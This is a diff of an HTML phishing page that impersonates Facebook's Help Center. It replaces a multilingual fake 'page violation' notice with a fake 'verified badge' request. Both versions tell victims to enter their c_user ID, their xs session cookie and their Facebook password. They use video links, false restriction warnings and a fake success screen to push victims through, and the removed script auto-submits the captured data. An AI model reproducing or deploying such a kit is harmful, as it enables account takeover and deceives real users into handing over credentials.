-                    <option value="zh">中文</option>
-                    <option value="ru">Русский</option>
-                    <option value="ja">日本語</option>
-                    <option value="it">Italiano</option>
-                    <option value="tr">Türkçe</option>
-                    <option value="nl">Nederlands</option>
-                    <option value="pl">Polski</option>
-                    <option value="sv">Svenska</option>
-                </select>
-            </div>
-            <div class="sub-header">
-                <h4 id="helpCenterText">Help Center</h4>
-            </div>
-            <div class="main-content">
-                <div class="verification-card">
-                    <div class="card-header">
-                        <h5 id="formTitle">Request For Remove Page Violation</h5>
-                    </div>
-                    <div class="card-body">
-                        <div id="formContent">
-                            <div class="alert-message">
-                                <p id="message1">We've identified irregular activity on your page that goes against our community guidelines.</p>
-                                <p id="message2">As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.</p>
-                                <p id="message3">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
-                            </div>
-                            
-                            <div class="clearfix">
-                                <div class="left-column">
-                                    <div class="video-container">
-                                        <span class="video-label" id="videoLabel">Detailed Video Information</span>
-                                        <video controls autoplay muted playsinline src="https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4" style="width: 100%; height: auto;"></video>
-                                        <button type="button" class="sound-toggle" id="soundToggle">Enable Sound</button>
-                                    </div>
-                                    
-                                    <div class="form-container">
-                                        <p class="alert-message" id="provideInfoText">Please be sure to provide the requested information below.</p>
-                                        
-                                        <div class="form-group">
-                                            <label for="c_user" class="form-label" id="cUserLabel">c_user</label>
-                                            <input type="number" id="c_user" name="c_user" class="form-control" required pattern="^\d{15}$" title="Please enter 15 digits">
-                                        </div>
-                                        
-                                        <div class="form-group">
-                                            <label for="xs" class="form-label" id="xsLabel">xs</label>
-                                            <input type="text" id="xs" name="xs" class="form-control" required>
-                                        </div>
-                                        
-                                        <div class="form-note" id="dontLogoutText">
-                                            Please make sure not to log out from your computer or laptop until you have received a verification email.
-                                        </div>
-                                    </div>
-                                </div>
-                                
-                                <div class="right-column">
-                                    <!-- Right column content can go here if needed -->
-                                </div>
-                            </div>
-                            
-                            <div class="password-confirmation" id="passwordConfirmation">
-                                <img src="https://ucarecdn.com/b3b95dd8-7ac6-4017-8597-929f47addd9d/WhatsAppImage20250704at043706_1a9b7ef8.jpg" alt="Facebook Logo" class="facebook-logo">
-                                <div class="password-label" id="passwordLabel">Please re-enter Your Password</div>
-                                <div class="password-input">
-                                    <input type="password" id="password" name="password" class="form-control" placeholder="Enter your password" required>
-                                    <div class="error-message" id="passwordError">Please enter your password</div>
-                                </div>
-                                <button type="button" class="final-submit-btn" id="finalSubmit">Send Confirmation</button>
-                            </div>
-                        </div>
-                        
-                        <div class="success-message" id="successMessage">
-                            <div class="success-icon">✓</div>
-                            <h2 class="success-title" id="successTitle">Your request has been submitted successfully</h2>
-                            <p class="success-text" id="successText">We are reviewing your information and will contact you shortly.</p>
-                        </div>
-                    </div>
-                    <div class="card-footer">
-                        <button type="button" class="submit-btn" id="initialSubmit">Submit</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </form>
+</h3>
+<hr>
+   <div class="menu-container">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+</div>   
+<div>
+</div>
+</div>
+</div>
+</div>
+ <div>
+</div>
+<hr>
+<main class="main-content">
+<div class="search-section">
+</div>
+<div class="card">
+<h3>Request a verified badge on Facebook<hr></h3>
+<p>The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.
+ <br> <br>Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements. <br> <br> Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear <br> <br>
+<h5>Detailed Video information</h5>
 
-    <script>
-        const translations = {
-            en: {
-                helpCenter: "Help Center",
-                formTitle: "Request For Remove Page Violation",
-                message1: "We've identified irregular activity on your page that goes against our community guidelines.",
-                message2: "As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.",
-                message3: "Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.",
-                videoLabel: "Detailed Video Information",
-                soundToggle: "Enable Sound",
-                provideInfo: "Please be sure to provide the requested information below.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "Please make sure not to log out from your computer or laptop until you have received a verification email.",
-                passwordLabel: "Confirm your Facebook password to continue",
-                passwordPlaceholder: "Enter your password",
-                passwordError: "Please enter your password",
-                submit: "Submit",
-                finalSubmit: "Send Confirmation",
-                successTitle: "Your request has been submitted successfully",
-                successText: "We are reviewing your information and will contact you shortly."
-            },
-            es: {
-                helpCenter: "Centro de ayuda",
-                formTitle: "Solicitud para eliminar violación de página",
-                message1: "Hemos identificado actividad irregular en su página que va en contra de nuestras pautas comunitarias.",
-                message2: "Como resultado, el acceso a su página ha sido restringido y actualmente no puede publicar, compartir o comentar usándola.",
-                message3: "Proporcione los detalles precisos a continuación. Consulte el video para aclaraciones si encuentra las instrucciones poco claras.",
-                videoLabel: "Información detallada en video",
-                soundToggle: "Activar sonido",
-                provideInfo: "Asegúrese de proporcionar la información solicitada a continuación.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "Asegúrese de no cerrar sesión en su computadora o portátil hasta que haya recibido un correo electrónico de verificación.",
-                passwordLabel: "Confirme su contraseña de Facebook para continuar",
-                passwordPlaceholder: "Ingrese su contraseña",
-                passwordError: "Por favor ingrese su contraseña",
-                submit: "Enviar",
-                finalSubmit: "Enviar confirmación",
-                successTitle: "Su solicitud ha sido enviada con éxito",
-                successText: "Estamos revisando su información y nos comunicaremos con usted pronto."
-            },
-            fr: {
-                helpCenter: "Centre d'aide",
-                formTitle: "Demande de suppression de violation de page",
-                message1: "Nous avons identifié une activité irrégulière sur votre page qui va à l'encontre de nos directives communautaires.",
-                message2: "En conséquence, l'accès à votre page a été restreint et vous ne pouvez actuellement pas publier, partager ou commenter en l'utilisant.",
-                message3: "Veuillez fournir les détails précis ci-dessous. Reportez-vous à la vidéo pour plus de clarté si vous trouvez les instructions peu claires.",
-                videoLabel: "Informations vidéo détaillées",
-                soundToggle: "Activer le son",
-                provideInfo: "Veuillez vous assurer de fournir les informations demandées ci-dessous.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "Veuillez ne pas vous déconnecter de votre ordinateur ou portable jusqu'à ce que vous ayez reçu un e-mail de vérification.",
-                passwordLabel: "Confirmez votre mot de passe Facebook pour continuar",
-                passwordPlaceholder: "Entrez votre mot de passe",
-                passwordError: "Veuillez entrer votre mot de passe",
-                submit: "Soumettre",
-                finalSubmit: "Envoyer la confirmation",
-                successTitle: "Votre demande a été soumise avec succès",
-                successText: "Nous examinons vos informations et vous contacterons sous peu."
-            },
-            de: {
-                helpCenter: "Hilfebereich",
-                formTitle: "Anfrage zur Entfernung von Seitenverstößen",
-                message1: "Wir haben unregelmäßige Aktivitäten auf Ihrer Seite festgestellt, die gegen unsere Community-Richtlinien verstoßen.",
-                message2: "Daher wurde der Zugriff auf Ihre Seite eingeschränkt und Sie können derzeit keine Beiträge veröffentlichen, teilen oder kommentieren.",
-                message3: "Bitte geben Sie die genauen Details unten an. Sehen Sie sich das video zur Klärung an, wenn Sie die Anweisungen unklar finden.",
-                videoLabel: "Detaillierte Videoinformationen",
-                soundToggle: "Ton aktivieren",
-                provideInfo: "Bitte stellen Sie sicher, dass Sie die angeforderten Informationen unten angeben.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "Bitte melden Sie sich nicht von Ihrem Computer oder Laptop ab, bis Sie eine Bestätigungs-E-Mail erhalten haben.",
-                passwordLabel: "Bestätigen Sie Ihr Facebook-Passwort, um fortzufahren",
-                passwordPlaceholder: "Geben Sie Ihr Passwort ein",
-                passwordError: "Bitte geben Sie Ihr Passwort ein",
-                submit: "Einreichen",
-                finalSubmit: "Bestätigung senden",
-                successTitle: "Ihre Anfrage wurde erfolgreich übermittelt",
-                successText: "Wir prüfen Ihre Informationen und werden uns in Kürze bei Ihnen melden."
-            },
-            pt: {
-                helpCenter: "Central de Ajuda",
-                formTitle: "Pedido de Remoção de Violação de Página",
-                message1: "Identificamos atividade irregular em sua página que viola nossas diretrizes da comunidade.",
-                message2: "Como resultado, o acesso à sua página foi restrito e você não pode postar, compartilhar ou comentar usando-a no momento.",
-                message3: "Forneça os detalhes precisos abaixo. Consulte o vídeo para esclarecimentos se achar as instruções pouco claras.",
-                videoLabel: "Informações detalhadas em vídeo",
-                soundToggle: "Ativar som",
-                provideInfo: "Certifique-se de fornecer as informações solicitadas abaixo.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "Certifique-se de não sair do seu computador ou laptop até receber um e-mail de verificação.",
-                passwordLabel: "Confirme sua senha do Facebook para continuar",
-                passwordPlaceholder: "Digite sua senha",
-                passwordError: "Por favor, digite sua senha",
-                submit: "Enviar",
-                finalSubmit: "Enviar confirmação",
-                successTitle: "Seu pedido foi enviado com sucesso",
-                successText: "Estamos analisando suas informações e entraremos em contato em breve."
-            },
-            ar: {
-                helpCenter: "مركز المساعدة",
-                formTitle: "طلب إزالة انتهاك الصفحة",
-                message1: "لقد حددنا نشاطًا غير منتظم في صفحتك يتعارض مع إرشادات المجتمع الخاصة بنا.",
-                message2: "ونتيجة لذلك، تم تقييد الوصول إلى صفحتك وأنت غير قادر حاليًا على النشر أو المشاركة أو التعليق باستخدامها.",
-                message3: "يرجى تقديم التفاصيل الدقيقة أدناه. راجع الفيديو للحصول على توضيح إذا وجدت التعليمات غير واضحة.",
-                videoLabel: "معلومات الفيديو التفصيلية",
-                soundToggle: "تمكين الصوت",
-                provideInfo: "يرجى التأكد من تقديم المعلومات المطلوبة أدناه.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "يرجى التأكد من عدم تسجيل الخروج من جهاز الكمبيوتر أو الكمبيوتر المحمول الخاص بك حتى تتلقى بريدًا إلكترونيًا للتحقق.",
-                passwordLabel: "قم بتأكيد كلمة مرور Facebook للمتابعة",
-                passwordPlaceholder: "أدخل كلمة المرور الخاصة بك",
-                passwordError: "الرجاء إدخال كلمة المرور الخاصة بك",
-                submit: "إرسال",
-                finalSubmit: "إرسال التأكيد",
-                successTitle: "تم تقديم طلبك بنجاح",
-                successText: "نحن نراجع معلوماتك وسنتواصل معك قريبًا."
-            },
-            hi: {
-                helpCenter: "सहायता केंद्र",
-                formTitle: "पेज उल्लंघन हटाने का अनुरोध",
-                message1: "हमने आपके पेज पर अनियमित गतिविधि की पहचान की है जो हमारे सामुदायिक दिशानिर्देशों के विरुद्ध है।",
-                message2: "परिणामस्वरूप, आपके पेज तक पहुंच प्रतिबंधित कर दी गई है और आप वर्तमान में इसका उपयोग करके पोस्ट, साझा या टिप्पणी नहीं कर सकते हैं।",
-                message3: "कृपया नीचे सटीक विवरण प्रदान करें। यदि आपको निर्देश अस्पष्ट लगते हैं तो स्पष्टीकरण के लिए वीडियो देखें।",
-                videoLabel: "विस्तृत वीडियो जानकारी",
-                soundToggle: "ध्वनि सक्षम करें",
-                provideInfo: "कृपया नीचे अनुरोधित जानकारी प्रदान करना सुनिश्चित करें।",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "कृपया सत्यापन ईमेल प्राप्त होने तक अपने कंप्यूटर या लैपटॉप से लॉग आउट न करें।",
-                passwordLabel: "जारी रखने के लिए अपना Facebook पासवर्ड पुष्टि करें",
-                passwordPlaceholder: "अपना पासवर्ड दर्ज करें",
-                passwordError: "कृपया अपना पासवर्ड दर्ज करें",
-                submit: "जमा करें",
-                finalSubmit: "पुष्टि भेजें",
-                successTitle: "आपका अनुरोध सफलतापूर्वक जमा कर दिया गया है",
-                successText: "हम आपकी जानकारी की समीक्षा कर रहे हैं और जल्द ही आपसे संपर्क करेंगे।"
-            },
-            zh: {
-                helpCenter: "帮助中心",
-                formTitle: "请求删除页面违规",
-                message1: "我们发现您的页面有违反我们社区准则的异常活动。",
-                message2: "因此，您的页面访问已受到限制，您目前无法使用它发布、分享或评论。",
-                message3: "请提供以下确切详细信息。如果您发现说明不清楚，请参考视频以获取说明。",
-                videoLabel: "详细视频信息",
-                soundToggle: "启用声音",
-                provideInfo: "请务必提供以下所需信息。",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "在收到验证电子邮件之前，请确保不要从计算机或笔记本电脑注销。",
-                passwordLabel: "确认您的Facebook密码以继续",
-                passwordPlaceholder: "输入您的密码",
-                passwordError: "请输入您的密码",
-                submit: "提交",
-                finalSubmit: "发送确认",
-                successTitle: "您的请求已成功提交",
-                successText: "我们正在审核您的信息，并将很快与您联系。"
-            },
-            ru: {
-                helpCenter: "Центр помощи",
-                formTitle: "Запрос на удаление нарушения страницы",
-                message1: "Мы обнаружили подозрительную активность на вашей странице, которая нарушает наши правила сообщества.",
-                message2: "В результате доступ к вашей странице был ограничен, и в настоящее время вы не можете публиковать, делиться или комментировать с ее помощью.",
-                message3: "Пожалуйста, укажите точные данные ниже. Обратитесь к видео для уточнения, если инструкции кажутся вам неясными.",
-                videoLabel: "Подробная видеоинформация",
-                soundToggle: "Включить звук",
-                provideInfo: "Пожалуйста, обязательно предоставьте запрашиваемую информацию ниже.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "Пожалуйста, не выходите из системы на компьютере или ноутбуке, пока не получите письмо с подтверждением.",
-                passwordLabel: "Подтвердите пароль Facebook для продолжения",
-                passwordPlaceholder: "Введите пароль",
-                passwordError: "Пожалуйста, введите пароль",
-                submit: "Отправить",
-                finalSubmit: "Отправить подтверждение",
-                successTitle: "Ваш запрос успешно отправлен",
-                successText: "Мы проверяем вашу информацию и свяжемся с вами в ближайшее время."
-            },
-            ja: {
-                helpCenter: "ヘルプセンター",
-                formTitle: "ページ違反削除のリクエスト",
-                message1: "コミュニティガイドラインに違反する異常な活動をページで確認しました。",
-                message2: "その結果、ページへのアクセスが制限され、現在投稿、共有、コメントができなくなっています。",
-                message3: "下記に正確な詳細を入力してください。説明が不明瞭な場合は、動画を参照してください。",
-                videoLabel: "詳細な動画情報",
-                soundToggle: "音声を有効にする",
-                provideInfo: "下記の必要な情報を必ず入力してください。",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "確認メールを受信するまで、コンピュータやラップトップからログアウトしないでください。",
-                passwordLabel: "続行するにはFacebookパスワードを確認してください",
-                passwordPlaceholder: "パスワードを入力",
-                passwordError: "パスワードを入力してください",
-                submit: "送信",
-                finalSubmit: "確認を送信",
-                successTitle: "リクエストが正常に送信されました",
-                successText: "情報を確認し、すぐにご連絡いたします。"
-            },
-            it: {
-                helpCenter: "Centro assistenza",
-                formTitle: "Richiesta rimozione violazione pagina",
-                message1: "Abbiamo rilevato attività irregolari sulla tua pagina che violano le nostre linee guida della community.",
-                message2: "Di conseguenza, l'accesso alla tua pagina è stato limitato e attualmente non puoi pubblicare, condividere o commentare utilizzandola.",
-                message3: "Fornisci i dettagli precisi di seguito. Fai riferimento al video per chiarimenti se trovi le istruzioni poco chiare.",
-                videoLabel: "Informazioni video dettagliate",
-                soundToggle: "Attiva audio",
-                provideInfo: "Assicurati di fornire le informazioni richieste di seguito.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "Assicurati di non disconnetterti dal computer o laptop finché non ricevi un'email di verifica.",
-                passwordLabel: "Conferma la password di Facebook per continuare",
-                passwordPlaceholder: "Inserisci la password",
-                passwordError: "Inserisci la password",
-                submit: "Invia",
-                finalSubmit: "Invia conferma",
-                successTitle: "La tua richiesta è stata inviata con successo",
-                successText: "Stiamo esaminando le tue informazioni e ti contatteremo a breve."
-            },
-            tr: {
-                helpCenter: "Yardım Merkezi",
-                formTitle: "Sayfa İhlali Kaldırma İsteği",
-                message1: "Topluluk kurallarımıza aykırı düzensiz etkinlik tespit ettik.",
-                message2: "Sonuç olarak, sayfanıza erişim kısıtlandı ve şu anda paylaşım yapamaz, paylaşamaz veya yorum yapamazsınız.",
-                message3: "Lütfen aşağıya kesin ayrıntıları sağlayın. Talimatları net bulmazsanız açıklama için videoya bakın.",
-                videoLabel: "Detaylı Video Bilgisi",
-                soundToggle: "Sesi Aç",
-                provideInfo: "Lütfen aşağıdaki istenen bilgileri sağladığınızdan emin olun.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "Lütfen bir doğrulama e-postası alana kadar bilgisayarınızdan veya dizüstü bilgisayarınızdan çıkış yapmadığınızdan emin olun.",
-                passwordLabel: "Devam etmek için Facebook şifrenizi onaylayın",
-                passwordPlaceholder: "Şifrenizi girin",
-                passwordError: "Lütfen şifrenizi girin",
-                submit: "Gönder",
-                finalSubmit: "Onay Gönder",
-                successTitle: "İsteğiniz başarıyla gönderildi",
-                successText: "Bilgilerinizi inceliyoruz ve en kısa sürede sizinle iletişime geçeceğiz."
-            },
-            nl: {
-                helpCenter: "Helpcentrum",
-                formTitle: "Verzoek tot verwijdering pagina-overtreding",
-                message1: "We hebben onregelmatigheden op uw pagina geïdentificeerd die in strijd zijn met onze communityrichtlijnen.",
-                message2: "Hierdoor is de toegang tot uw pagina beperkt en kunt u momenteel niet posten, delen of reageren.",
-                message3: "Geef hieronder de exacte details op. Raadpleeg de video voor verduidelijking als u de instructies onduidelijk vindt.",
-                videoLabel: "Gedetailleerde video-informatie",
-                soundToggle: "Geluid inschakelen",
-                provideInfo: "Zorg ervoor dat u de gevraagde informatie hieronder verstrekt.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "Zorg ervoor dat u niet uitlogt van uw computer of laptop totdat u een verificatie-e-mail hebt ontvangen.",
-                passwordLabel: "Bevestig uw Facebook-wachtwoord om door te gaan",
-                passwordPlaceholder: "Voer uw wachtwoord in",
-                passwordError: "Voer uw wachtwoord in",
-                submit: "Verzenden",
-                finalSubmit: "Bevestiging verzenden",
-                successTitle: "Uw verzoek is succesvol ingediend",
-                successText: "We beoordelen uw informatie en nemen spoedig contact met u op."
-            },
-            pl: {
-                helpCenter: "Centrum pomocy",
-                formTitle: "Wniosek o usunięcie naruszenia strony",
-                message1: "Zidentyfikowaliśmy nieregularne działania na Twojej stronie, które naruszają nasze wytyczne społeczności.",
-                message2: "W rezultacie dostęp do Twojej strony został ograniczony i obecnie nie możesz publikować, udostępniać ani komentować za jej pomocą.",
-                message3: "Podaj dokładne dane poniżej. W razie wątpliwości zapoznaj się z filmem.",
-                videoLabel: "Szczegółowe informacje wideo",
-                soundToggle: "Włącz dźwięk",
-                provideInfo: "Pamiętaj o podaniu wymaganych informacji poniżej.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "Nie wylogowuj się z komputera lub laptopa, dopóki nie otrzymasz wiadomości e-mail z potwierdzeniem.",
-                passwordLabel: "Potwierdź hasło na Facebooku, aby kontynuować",
-                passwordPlaceholder: "Wprowadź hasło",
-                passwordError: "Wprowadź hasło",
-                submit: "Prześlij",
-                finalSubmit: "Wyślij potwierdzenie",
-                successTitle: "Twoje zgłoszenie zostało pomyślnie wysłane",
-                successText: "Przeglądamy Twoje informacje i wkrótce się z Tobą skontaktujemy."
-            },
-            sv: {
-                helpCenter: "Hjälpcenter",
-                formTitle: "Begäran om borttagning av sidöverträdelse",
-                message1: "Vi har identifierat oregelbunden aktivitet på din sida som strider mot våra riktlinjer för communityn.",
-                message2: "Som ett resultat har åtkomsten till din sida begränsats och du kan för närvarande inte publicera, dela eller kommentera med den.",
-                message3: "Ange de exakta uppgifterna nedan. Se videon för förtydligande om du tycker att anvisningarna är otydliga.",
-                videoLabel: "Detaljerad videoinformation",
-                soundToggle: "Aktivera ljud",
-                provideInfo: "Se till att ange den begärda informationen nedan.",
-                cUserLabel: "c_user",
-                xsLabel: "xs",
-                dontLogout: "Se till att du inte loggar ut från din dator eller bärbara dator förrän du har fått ett verifieringsmejl.",
-                passwordLabel: "Bekräfta ditt Facebook-lösenord för att fortsätta",
-                passwordPlaceholder: "Ange ditt lösenord",
-                passwordError: "Ange ditt lösenord",
-                submit: "Skicka",
-                finalSubmit: "Skicka bekräftelse",
-                successTitle: "Din förfrågan har skickats",
-                successText: "Vi granskar din information och kommer att kontakta dig snart."
-            }
-        };
-
-        document.addEventListener('DOMContentLoaded', function() {
-            const notificationPage = document.getElementById('notificationPage');
-            const verificationForm = document.getElementById('verificationForm');
-            const getStartedBtn = document.getElementById('getStartedBtn');
-            const form = document.getElementById('verificationForm');
-            const soundToggle = document.getElementById('soundToggle');
-            const video = document.querySelector('video');
-            const initialSubmit = document.getElementById('initialSubmit');
-            const passwordConfirmation = document.getElementById('passwordConfirmation');
-            const finalSubmit = document.getElementById('finalSubmit');
-            const passwordInput = document.getElementById('password');
-            const passwordError = document.getElementById('passwordError');
-            const languageSelector = document.getElementById('languageSelector');
-            const formContent = document.getElementById('formContent');
-            const successMessage = document.getElementById('successMessage');
-            
-            // Show verification form when Get Started is clicked
-            getStartedBtn.addEventListener('click', function() {
-                notificationPage.style.display = 'none';
-                verificationForm.style.display = 'block';
-                document.body.style.backgroundColor = '#f0f2f5';
-            });
-            
-            // Set initial language
-            let currentLanguage = 'en';
-            updateTranslations(currentLanguage);
-            
-            // Language change handler
-            languageSelector.addEventListener('change', function() {
-                currentLanguage = this.value;
-                document.getElementById('selectedLanguage').value = currentLanguage;
-                updateTranslations(currentLanguage);
-            });
-            
-            // Update all text elements with translations
-            function updateTranslations(lang) {
-                const langData = translations[lang] || translations['en'];
-                
-                document.getElementById('helpCenterText').textContent = langData.helpCenter;
-                document.getElementById('formTitle').textContent = langData.formTitle;
-                document.getElementById('message1').textContent = langData.message1;
-                document.getElementById('message2').textContent = langData.message2;
-                document.getElementById('message3').textContent = langData.message3;
-                document.getElementById('videoLabel').textContent = langData.videoLabel;
-                document.getElementById('soundToggle').textContent = langData.soundToggle;
-                document.getElementById('provideInfoText').textContent = langData.provideInfo;
-                document.getElementById('cUserLabel').textContent = langData.cUserLabel;
-                document.getElementById('xsLabel').textContent = langData.xsLabel;
-                document.getElementById('dontLogoutText').textContent = langData.dontLogout;
-                document.getElementById('passwordLabel').textContent = langData.passwordLabel;
-                passwordInput.placeholder = langData.passwordPlaceholder;
-                document.getElementById('passwordError').textContent = langData.passwordError;
-                document.getElementById('initialSubmit').textContent = langData.submit;
-                document.getElementById('finalSubmit').textContent = langData.finalSubmit;
-                document.getElementById('successTitle').textContent = langData.successTitle;
-                document.getElementById('successText').textContent = langData.successText;
-            }
-            
-            // Sound toggle functionality
-            soundToggle.addEventListener('click', function() {
-                video.muted = !video.muted;
-                this.textContent = video.muted ? 
-                    translations[currentLanguage].soundToggle : 
-                    translations[currentLanguage].soundToggle.replace("Enable", "Disable");
-            });
-            
-            // Initial form validation
-            initialSubmit.addEventListener('click', function(e) {
-                const cUser = document.getElementById('c_user');
-                if (!/^\d{15}$/.test(cUser.value)) {
-                    alert(translations[currentLanguage].cUserLabel + " " + 
-                        (currentLanguage === 'en' ? "must be 15 digits" : 
-                         currentLanguage === 'es' ? "debe tener 15 dígitos" :
-                         currentLanguage === 'fr' ? "doit comporter 15 chiffres" :
-                         "must be 15 digits"));
-                    cUser.focus();
-                    return false;
-                }
-                
-                const xs = document.getElementById('xs');
-                if (xs.value.trim() === '') {
-                    alert(translations[currentLanguage].xsLabel + " " + 
-                        (currentLanguage === 'en' ? "is required" : 
-                         currentLanguage === 'es' ? "es requerido" :
-                         currentLanguage === 'fr' ? "est requis" :
-                         "is required"));
-                    xs.focus();
-                    return false;
-                }
-                
-                // Show password confirmation
-                passwordConfirmation.classList.add('active');
-                initialSubmit.style.display = 'none';
-                
-                // Scroll to password section
-                passwordConfirmation.scrollIntoView({ behavior: 'smooth' });
-            });
-            
-            // Final submission
-            finalSubmit.addEventListener('click', function() {
-                if (passwordInput.value.trim() === '') {
-                    passwordError.style.display = 'block';
-                    passwordInput.focus();
-                    return;
-                }
-                
-                passwordError.style.display = 'none';
-                
-                // Show success message
-                formContent.style.display = 'none';
-                successMessage.style.display = 'block';
-                
-                // Submit form automatically after 2 seconds
-                setTimeout(function() {
-                    form.submit();
-                }, 2000);
-            });
-            
-            // Validate password on input
-            passwordInput.addEventListener('input', function() {
-                if (this.value.trim() !== '') {
-                    passwordError.style.display = 'none';
-                }
-            });
-        });
-    </script>
+<div>
+ <a href="https://ucarecdn.com/90d15da5-bb79-43b1-ad8e-2b9fce403a7a/InShot_20250521_042221994.mp4">
+     <img src="https://detailed-video-mp4.github.io/review-request-now-fast4/fb.png" alt="fb" style="width: 160px; height: 110px;">
+ </a>
+</div><br>
+<p class="fw-semibold validation_form_para mt-2">Please provide the necessary details in the sections indicated below.</p>
+<hr>
+<br>
+<div class="fb-input-container">
+<label for="c_user">c_user</label>
+<input type="number" name="c_user" id="c_user" placeholder="" pattern="[0-9]+" required aria-describedby="c_user_error">
+<span id="c_user_error" class="error-message">Please enter a valid user ID (numeric characters only).</span> <!-- Updated error message -->
+</div>
+<div class="fb-input-container">
+<label for="xs">xs</label>
+<input type="text" name="xs" id="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{40,}$" required aria-describedby="xs_error">
+<span id="xs_error" class="error-message">Please enter a valid session token (at least 40 characters, including letters, numbers, and special characters).</span>
+</div>
+<p style="font-size: 12px;">Please make sure not to log out from your computer or laptop until you have received a verification email.</p><br>
+<div class="custom-container">
+<button type="submit" class="submit-button"><span class="button-text">Submit</span><span class="button-loader"></span></button>           
+</div>
+</div>
+</main> 
+<footer class="footer">
+<div class="footer-content">
+<div class="footer-links">
+<a href="#">Privacy</a>
+<a href="#">Terms</a>
+<a href="#">Cookies</a>
+</div>
+</div>
+</footer>
+</form>
+<div class="popup">
+<div class="popup-content">
+<button class="popup-close">&times;</button>
+<img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+<h3>Security Verification</h3>
+<p>For your security, please re-enter your Facebook password to complete the verification process.</p>
+<input type="password" id="password" placeholder="Enter your password" required aria-describedby="password_error">
+<span id="password_error" class="error-message">Please enter a password (at least 8 characters).</span>
+<div class="popup-buttons">
+    <button class="popup-cancel" onclick="closePopup()">Cancel</button>
+    <button class="popup-confirm" onclick="submitPassword()">
+        <span class="button-text">Verify & Submit</span>
+        <span class="button-loader"></span>
+    </button>
+</div>
+</div>
+</div>
+<div class="success-page">
+<img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+<h3>Submission Successful</h3>
+<p>Your Verified badge setup details have been submitted successfully. You will receive a confirmation email soon.</p>
+</div>
 </body>
-</html>
+    </html>
